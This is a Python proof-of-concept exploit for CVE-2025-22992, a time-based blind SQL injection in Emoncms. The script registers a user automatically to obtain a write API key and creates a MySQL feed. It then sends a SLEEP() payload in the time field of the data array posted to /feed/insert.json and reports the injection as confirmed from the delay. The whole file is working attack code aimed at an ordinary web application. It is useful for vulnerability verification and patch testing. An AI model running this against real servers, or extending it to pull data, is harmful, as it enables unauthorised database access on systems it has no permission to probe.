#!/usr/bin/env python3
import requests
import time
import sys
import json
import argparse

SLEEP_TIME = 3
THRESHOLD = 2.5

def register_user(target, username, password, email):
    url = f"{target}/user/register.json"
    data = {"username": username, "password": password, "confirm_password": password, "email": email}
    resp = requests.post(url, data=data, timeout=30)
    return resp.json()

def create_feed(target, apikey, name="sqlifeed", tag="sqli", engine=0):
    url = f"{target}/feed/create.json"
    params = {"apikey": apikey, "name": name, "tag": tag, "engine": engine}
    resp = requests.get(url, params=params, timeout=30)
    try:
        return resp.json()
    except:
        return {"success": False, "message": resp.text}

def sql_injection_test(target, apikey, feedid, sleep_seconds=3):
    url = f"{target}/feed/insert.json"
    params = {"id": feedid, "apikey": apikey}
    payload = json.dumps([[f"1' and SLEEP({sleep_seconds}) and '1'='1", 100]])
    
    start_time = time.time()
    resp = requests.post(url, params=params, data={"data": payload}, timeout=60)
    elapsed = time.time() - start_time
    
    return elapsed, resp

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-22992 Emoncms SQL Injection PoC')
    parser.add_argument('-t', '--target', default='http://localhost:8091', help='Target URL')
    parser.add_argument('-a', '--apikey', help='Write API key (optional, will register new user if not provided)')
    parser.add_argument('-f', '--feedid', type=int, help='Existing feed ID to use')
    args = parser.parse_args()
    
    target = args.target.rstrip('/')
    print("[*] CVE-2025-22992 - Emoncms SQL Injection PoC")
    print(f"[*] Target: {target}")
    print()
    
    apikey = args.apikey
    feedid = args.feedid
    
    if not apikey:
        print("[+] Step 1: Registering user...")
        import random
        username = f"poc{random.randint(10000,99999)}"
        try:
            result = register_user(target, username, "pocpass123", f"{username}@test.com")
            if isinstance(result, dict) and result.get("success"):
                apikey = result.get("apikey_write")
                print(f"    User {username} registered successfully")
                print(f"    API Key: {apikey}")
            else:
                print(f"[-] Registration failed: {result}")
                print("[-] Please provide API key using -a/--apikey option")
                return 1
        except Exception as e:
            print(f"[-] Error: {e}")
            return 1
    else:
        print(f"[+] Using provided API Key: {apikey[:8]}...")
    print()
    
    if not feedid:
        print("[+] Step 2: Creating MySQL engine feed...")
        try:
            import random
            feedname = f"sqlifeed{random.randint(1000,9999)}"
            result = create_feed(target, apikey, name=feedname)
            if isinstance(result, dict) and result.get("success"):
                feedid = result.get("feedid")
                print(f"    Feed created. feedid={feedid}")
            else:
                print(f"[-] Feed creation failed: {result}")
                print("[-] Trying with feed ID 1...")
                feedid = 1
        except Exception as e:
            print(f"[-] Error: {e}")
            feedid = 1
    else:
        print(f"[+] Using provided feed ID: {feedid}")
    print()
    
    print(f"[+] Step 3: Testing SQL Injection (time-based blind)...")
    print(f"    Injecting SLEEP({SLEEP_TIME}) into time parameter...")
    
    try:
        elapsed, resp = sql_injection_test(target, apikey, feedid, SLEEP_TIME)
        print(f"    Response time: {elapsed:.2f} seconds")
        print(f"    Response: {resp.text[:100]}")
        
        if elapsed >= THRESHOLD:
            print()
            print("[!] SQL Injection Confirmed!")
            print(f"    The server took {elapsed:.2f}s to respond (threshold: {THRESHOLD}s)")
            print("    This confirms the SLEEP() function was executed in the database.")
            print()
            print("[+] Vulnerability Details:")
            print("    - Endpoint: /feed/insert.json")
            print("    - Parameter: data (JSON array)")
            print("    - Vulnerable field: time value in data array")
            print("    - Condition: MySQL/MariaDB engine feed (engine=0)")
            print()
            return 0
        else:
            print()
            print("[-] SQL Injection not confirmed")
            print(f"    Response time ({elapsed:.2f}s) below threshold ({THRESHOLD}s)")
            return 1
            
    except Exception as e:
        print(f"[-] Error during injection test: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
